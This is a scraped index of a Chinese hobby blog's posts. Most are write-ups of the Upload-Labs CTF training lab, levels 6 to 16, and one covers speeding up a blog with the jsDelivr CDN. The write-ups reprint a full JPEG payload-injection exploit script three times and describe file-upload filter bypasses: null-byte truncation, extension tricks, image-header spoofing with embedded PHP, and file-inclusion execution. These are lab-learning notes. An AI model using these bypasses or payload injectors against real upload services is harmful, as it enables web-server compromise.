$imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u003ebinData = ''; $this-\u003eorder = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-\u003ebinData = file_get_contents($filename); } else { $this-\u003ebinData = $filename; } $this-\u003esize = strlen($this-\u003ebinData); } public function seek() { return ($this-\u003esize - strlen($this-\u003ebinData)); } public function skip($skip) { $this-\u003ebinData = substr($this-\u003ebinData, $skip); } public function readByte() { if($this-\u003eeof()) { die('End Of File'); } $byte = substr($this-\u003ebinData, 0, 1); $this-\u003ebinData = substr($this-\u003ebinData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u003ebinData) \u003c 2) { die('End Of File'); } $short = substr($this-\u003ebinData, 0, 2); $this-\u003ebinData = substr($this-\u003ebinData, 2); if($this-\u003eorder) { $short =","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:3","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#准备-1"},{"categories":["CTF"],"content":"\rjpg格式​ 同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码 php ?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"\u003c?=phpinfo();?\u003e\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php '); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad \u003c 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u003ereadShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-\u003eeof()) \u0026\u0026 ($dis-\u003ereadByte() == 0xFF)) { $marker = $dis-\u003ereadByte(); $size = $dis-\u003ereadShort() - 2; $dis-\u003eskip($size); if($marker === 0xDA) { $startPos = $dis-\u003eseek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u003eeof())) { if($dis-\u003ereadByte() === 0xFF) { if($dis-\u003ereadByte !== 0x00) { break; } } } $stopPos = $dis-\u003eseek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u003ebinData = ''; $this-\u003eorder = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-\u003ebinData = file_get_contents($filename); } else { $this-\u003ebinData = $filename; } $this-\u003esize = strlen($this-\u003ebinData); } public function seek() { return ($this-\u003esize - strlen($this-\u003ebinData)); } public function skip($skip) { $this-\u003ebinData = substr($this-\u003ebinData, $skip); } public function readByte() { if($this-\u003eeof()) { die('End Of File'); } $byte = substr($this-\u003ebinData, 0, 1); $this-\u003ebinData = substr($this-\u003ebinData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u003ebinData) \u003c 2) { die('End Of File'); } $short = substr($this-\u003ebinData, 0, 2); $this-\u003ebinData = substr($this-\u003ebinData, 2); if($this-\u003eorder) { $short =","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:3","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#插入代码"},{"categories":["CTF"],"content":"\rjpg格式​ 同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码 php ?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"\u003c?=phpinfo();?\u003e\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php '); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad \u003c 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u003ereadShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-\u003eeof()) \u0026\u0026 ($dis-\u003ereadByte() == 0xFF)) { $marker = $dis-\u003ereadByte(); $size = $dis-\u003ereadShort() - 2; $dis-\u003eskip($size); if($marker === 0xDA) { $startPos = $dis-\u003eseek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u003eeof())) { if($dis-\u003ereadByte() === 0xFF) { if($dis-\u003ereadByte !== 0x00) { break; } } } $stopPos = $dis-\u003eseek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u003ebinData = ''; $this-\u003eorder = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-\u003ebinData = file_get_contents($filename); } else { $this-\u003ebinData = $filename; } $this-\u003esize = strlen($this-\u003ebinData); } public function seek() { return ($this-\u003esize - strlen($this-\u003ebinData)); } public function skip($skip) { $this-\u003ebinData = substr($this-\u003ebinData, $skip); } public function readByte() { if($this-\u003eeof()) { die('End Of File'); } $byte = substr($this-\u003ebinData, 0, 1); $this-\u003ebinData = substr($this-\u003ebinData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u003ebinData) \u003c 2) { die('End Of File'); } $short = substr($this-\u003ebinData, 0, 2); $this-\u003ebinData = substr($this-\u003ebinData, 2); if($this-\u003eorder) { $short =","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:3","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#上传并验证"},{"categories":["CTF"],"content":"\r前言​ 继续接着上一次的Upload-labs往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。 ​ 在线靶机地址： linux环境 windows环境 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs3/:1:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/ctf/upload-labs3/#前言"},{"categories":["CTF"],"content":"\rPass-11​ (这题使用了windows环境) ​ 源码： php $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; } }\r​ 分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了$_GET['save_path']，本题提示也写道 本pass上传路径可控！，就是通过这个GET变量控制上传路径。 ​ 这一关的突破方法需要有一些条件：php版本需要低于5.3.29（我使用的是php版本5.3.17的本地靶机），另一个条件是magic_quotes_gpc需要为关闭状态。magic_quotes_gpc的作用官方文档写道： Warning 本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。 ​ 为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 ’ (单引号)、\" (双引号)、\\（反斜杠）和 NUL’s 被一个反斜杠自动转义。 ​ 使用bp抓包并添加0x00截断，在GET请求中可以使用url编码的截断：%00。贴个自己参考的博客，截断上传原理剖析。个人对于这道题的分析就是，上面文件的代码执行到第8行的时候，获取到了$_GET['save_path']变量的值，但是我们在这个变量后面添加了0x00截断，所以后面的代码便不会执行，文件也就不会被重命名。 ​ 文件成功上传，然后访问的时候记得改一下路径，因为文件名已经截断，所以访问路径由..../upload/233.php�/5120201115205501.jpg变为..../upload/233.php。完工 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs3/:2:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/ctf/upload-labs3/#pass-11"},{"categories":["CTF"],"content":"\rPass-12​ （windows环境） ​ 这题和上一题差不多一样，就是把$_GET['save_path']变成了$_POST['save_path']。由GET请求改成了POST请求，但是抓包修改的地方就不一样了，需要通过16进制修改 ​ 这里我命名为233.phpa是因为方便我在Hex表中找到这句话的位置和修改数据。a的16进制是61，需要改成截断的值：00 ​ 上传成功以后打开图片，和上一题一样，需要把路径中已经截断的后面删除掉。完工 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs3/:3:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/ctf/upload-labs3/#pass-12"},{"categories":["CTF"],"content":"\rPass-13​ （Linux环境） ​ 源码中有关的函数解释： PHP中pack、unpack的详细用法 fread() fclose() intval() ​ 这道题和前面题目都不一样了： ​ 题目说道需要上传图片马，然后使用文件包含漏洞进行测试，那么我们就先制作图片马。 ​ 查看本题的提示本pass检查图标内容开头2个字节！，意思就是只检测文件前面两个字节的标识，贴一个各种格式图片文件头标识分析，所以这道题只用在上传的文件头部的两个字节处粘贴对应文件的头标识即可绕过检测。 ​ 以GIF的文件头GIF89a 为例，创建文件notepad++编辑打开输入GIF89a\u003c?php phpinfo(); ?\u003e，后缀名无所谓了，因为题目只检测前两个字节即可上传。 ​ 还有一种方法制作图片马：使用windows的copy /b指令，把两个文件进行无缝拼接，可以使用一张正常的图片加一个php文件进行拼接，即可正常上传。参考博客：windows窗口命令——(copy/b)文件无缝拼接隐藏。 ​ 别忘了题目中说道了需要三种后缀都上传成功才算过关！ ​ 上传以后需要使用文件包含进行判定是否执行，先在新标签页面中打开图片，url中记下图片在服务器中的目录和名称（我的图片名称为8220201116071327.gif），点击2的链接进入include.php进行文件包含：网址输入https://...../include.php?file=./upload/8220201116071327.gif，找到php成功执行的页面。这里还有一个小知识点我学到的就是：路径中的’.‘和’..‘还有’./‘和’../‘都是什么意思。完工 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs3/:4:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/ctf/upload-labs3/#pass-13"},{"categories":["CTF"],"content":"\rPass-14​ （Linux环境） ​ 这题提示写道本pass使用getimagesize()检查是否为图片文件！，和上一题不一样的地方就是使用了getimagesize()函数，这个函数的官方文档getimagesize()，所以这道题就不能用13题的加文件的头标识方法绕过，这次要使用上一题中的copy /b指令用一张正常的图片进行拼接还是可以通过的。 ​ PS：听同学说getimagesize()不过是检测了前八个字节，不过我没试。 ​ 因为是拼接的，所以要直接摸到图片最底部查看成功。完工 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs3/:5:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/ctf/upload-labs3/#pass-14"},{"categories":["CTF"],"content":"\rPass-15​ （Linux环境） ​ 13、14、15题都是对文件的头标识进行了检测，只不过第十四关使用的是getimagesize函数，第十五关使用的是exif_imagetype函数,函数返回值内容不一样而已。使用copy /b制作的图片马可以直接通过。 ​ 网上搜集过来的资料 png 文件头 89504E470D0A1A0A jpg 文件头 89504E470D0A1A0A gif 文件头 474946383961 ​ 这几个字节应该都是够长的可以绕过这三个函数，所以验证了同学说的不同的函数检测的文件头长度是不一样的。完工 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs3/:6:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(三)","uri":"/posts/ctf/upload-labs3/#pass-15"},{"categories":["瞎折腾"],"content":"\r前言​ 这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。 CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科 在犹豫要不要买的时候，发现了这个东西：jsdelivr，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞 ","date":"2020-11-11","objectID":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:1:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#前言"},{"categories":["瞎折腾"],"content":"\r1. 新建仓库 ​ 名字重了是因为我已经创建好了并且使用了以后才来写的博客。 ","date":"2020-11-11","objectID":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:2:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#1-新建仓库"},{"categories":["瞎折腾"],"content":"\r2. 克隆Git仓库到本地​ 在自己电脑建个文件夹然后打开git输入git clone 你仓库的链接，把刚刚创建的仓库拉倒本地方便上传到仓库。 廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：Git简介。 ","date":"2020-11-11","objectID":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:3:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#2-克隆git仓库到本地"},{"categories":["瞎折腾"],"content":"\r3. 上传需要加速的资源​ 把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。 text git status //查看状态 git add . //添加所有文件到暂存区 git commit -m '第一次提交' //把文件提交到仓库 git push //推送至远程仓库\r​ 这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。 ​ 接下来是要上传哪些文件，我使用的是butterfly这个主题，主题github支持一下作者，直接在主题theme/butterfly文件夹下面找到资源文件夹source发现里面都是一些零碎的文件，但是在发布文件夹public下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚 穷人流下了不争气的泪。传！(真加速还得选好服务器) ​ 这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。 ​ 做法：配置文件里找到引用的是本地资源的项，然后在生成网站的public文件下找到对应的资源文件。 我列一下我在配置文件里修改的项：main_css、main、utils、local_search、algolia_js、translate，因为使用的是Valine评论，里面可以设置自定义表情，我也使用这个方法修改了。 ","date":"2020-11-11","objectID":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:4:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#3-上传需要加速的资源"},{"categories":["瞎折腾"],"content":"\r3. 获取地址​ 官网首页很清楚的写明了如何获取资源链接 ​ https://cdn.jsdelivr.net/gh/user/repo@version/file，user就是你的github用户名，repo@version，仓库加上版本号，file就是仓库下的路径。 ​ 这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接reop@分支名，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。 ​ 贴一个我博客首页的壁纸链接：https://cdn.jsdelivr.net/gh/penginman/PicBed@master/top_img/83531406_p0.png ​ 这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。 ","date":"2020-11-11","objectID":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:5:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#3-获取地址"},{"categories":["瞎折腾"],"content":"\r4. 引用链接​ 配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了你现在引用的是之前的上传的静态资源，别忘啦！别忘啦！别忘啦！ ​ 我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。 ​ 还有我整理的Valine评论的自定义表情，大伙可以直接拿去用：图片地址，emojimap。完工 ","date":"2020-11-11","objectID":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/:6:0","series":null,"tags":["jsdelivr"],"title":"jsDelivr加速静态博客","uri":"/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/#4-引用链接"},{"categories":["CTF"],"content":"\r前言​ 这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。 text $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { //这里下面是过滤 $deny_ext = array(\".php\",\".php5\",\".php4\",\".html\", ......); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 //这里下面是移动文件。 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }\r过滤部分： $deny_ext是一个过滤的后缀数组，只要是在里面的后缀都是被禁止上传的。 $file_name = trim($FILES['upload_file']['name'])这段代码有两个点需要说： $FILES['upload_file']['name']是获取上传文件的名称，PHP中$FILES是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $FILES 为二维数组；如果为多个文件上传，那么 $FILES 为三维数组。贴一个参考的博客：PHP $_FILES函数详解。 trim()函数的作用就是去除文件名称前后的空格换行符等。 $file_name = deldot($file_name)这个注释中很清楚，是删除文章末尾的点。 $file_ext = strrchr($file_name, '.')中strrchr(string s1,char c1)函数查找字符或字符串c1在另一个字符串s1中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。说白了就是获取文件的后缀名。 $file_ext = strtolower($file_ext)注释上转换小写。 $file_ext = str_ireplace('::$DATA', '', $file_ext)去除字符串::$DATA。第八题讲了原理 上传部分： in_array($file_ext, $deny_ext)判断文件的后缀(第一个参数)是不是在黑名单数组(第二个参数)中。 $_FILES['upload_file']['tmp_name']文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定。 $img_path = UPLOAD_PATH.'/'.$file_name这个变量是设置需要保存到的路径 move_uploaded_file($temp_file, $img_path)本函数检查并确保指定的文件(第一个参数)是合法的上传文件(即通过 PHP 的 HTTP POST 上传机制所上传的)。如果文件合法，则将其移动为由指定的文件路径(第二个参数)。 ","date":"2020-11-09","objectID":"/posts/ctf/upload-labs2/:1:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/ctf/upload-labs2/#前言"},{"categories":["CTF"],"content":"\rPass-06源码： text $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }\r​ 看源码发现少了trim()函数对文件名前后的空格处理，所以我们可以在上传文件时在后缀名后面添加空格使其成为.php (有空格)绕过黑名单数组。 ​ 上传以后访问文件执行成功。完工 ​ 这里说明一下，我前面是在BUUCTF在线靶场上做的linux环境下的题目，但是这道题用了上面的方法怎么都访问不到，所以我在本地windows环境上搭建了一个靶机进行上传(而且后面有道题必须是在windows环境下才可以通过)。在github上下载的源码题目比在线靶场上的题目多了一道，对应的题目为 在线靶机pass-06–\u003egithub下载的pass-07。默认使用的都是linux环境下的题目，有改变会提前说明。 ​ ","date":"2020-11-09","objectID":"/posts/ctf/upload-labs2/:2:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/ctf/upload-labs2/#pass-06"},{"categories":["CTF"],"content":"\rPass-07源码： text $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }\r​ 这道题少了删除文件名末尾的点，我们可以通过构造2333.php. .(末尾加 点 空格 点)，被解析后文件后缀就会成为\". “(一个点一个空格)，可以绕过黑名单，访问的文件名是2333.php. . ​ 我又参考了其他博客，讲到windows环境下可以利用系统会自动删除后缀中最后的一个”.\"，尝试在windows靶机上测试只添加一个点，访问的文件名为2333.php、2333.php.都可以，因为windows会删除最后一个点。 ​ 两种方式第一个在linux环境下的php服务器上，第二个在windows环境下的php服务器上，上传后都可以成功访问文件。完工 ","date":"2020-11-09","objectID":"/posts/ctf/upload-labs2/:3:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/ctf/upload-labs2/#pass-07"},{"categories":["CTF"],"content":"\rPass-08源码： text $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else 